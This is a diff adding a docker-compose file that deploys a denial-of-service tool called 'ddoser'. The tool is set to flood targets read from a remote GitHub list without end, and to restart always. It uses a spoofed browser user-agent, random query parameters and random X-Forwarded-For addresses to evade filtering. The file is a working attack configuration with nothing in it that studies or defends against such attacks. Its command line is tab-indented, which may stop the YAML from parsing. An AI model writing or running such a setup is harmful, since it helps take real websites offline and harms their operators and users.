@@ -1,0 +1,8 @@
+version: '3'
+services:
+    ddoser:
+        image: imsamurai/ddoser
+        restart: always
+        tty: true
+        entrypoint: ./docker-entrypoint.sh
+    	command: --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --target-urls-file https://raw.githubusercontent.com/maxindahouze/reactor/main/targets3.txt --restart-period 600 --random-xff-ip
